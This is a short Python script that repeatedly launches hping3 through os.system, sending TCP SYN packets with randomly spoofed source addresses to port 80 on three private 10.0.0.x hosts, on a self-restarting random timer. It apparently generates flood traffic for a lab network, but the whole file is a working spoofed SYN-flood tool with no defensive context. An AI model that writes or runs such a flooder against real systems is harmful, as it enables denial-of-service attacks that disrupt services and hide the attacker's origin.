import threading
from random import randint
import random
import os


def _timer_printer():
    cout_ip=random.randint(0,80)
    rand_time_loop=random.uniform(1,3)
    pack='.'.join(['%s'%random.randint(0, 200),'.'.join('%s'%random.randint(0, 255) for i in range(3))])
    os.system("hping3 -S -V -p 80 -i u1 -c %s --spoof %s 10.0.0.2 " %(cout_ip,pack))
    os.system("hping3 -S -V -p 80 -i u1 -c %s --spoof %s 10.0.0.3 " %(cout_ip,pack))
    os.system("hping3 -S -V -p 80 -i u1 -c %s --spoof %s 10.0.0.4 " %(cout_ip,pack))
    print ("hping3 -S -V -p 80 -i u1 -c %s --spoof %s 10.0.0.2 " %(cout_ip,pack))

    
    threading.Timer(rand_time_loop,_timer_printer).start()

_timer_printer()

'''
if __name__=="__main__":
  main()
'''
